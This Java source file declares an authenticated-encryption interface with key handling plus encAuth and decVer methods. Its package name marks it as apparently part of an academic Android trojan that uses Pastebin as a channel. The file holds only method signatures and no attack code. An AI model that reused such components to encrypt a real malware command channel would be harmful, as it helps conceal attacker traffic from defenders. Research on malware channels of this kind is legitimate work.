/* Nethanel Gelernter (C) */

package il.ac.colman.androidtrojan.Channels.PasteBin.authenc;
import java.security.SecureRandom;


public interface AuthEnc {
	static SecureRandom random = new SecureRandom();

	AuthEncKey getAuthEncKey();
	void setKey(AuthEncKey key);
	void setKey(byte[] key);
	void genKey();
	byte[] encAuth(byte[] plaintext);
	byte[] decVer(byte[] ciphertext) throws Exception;
}
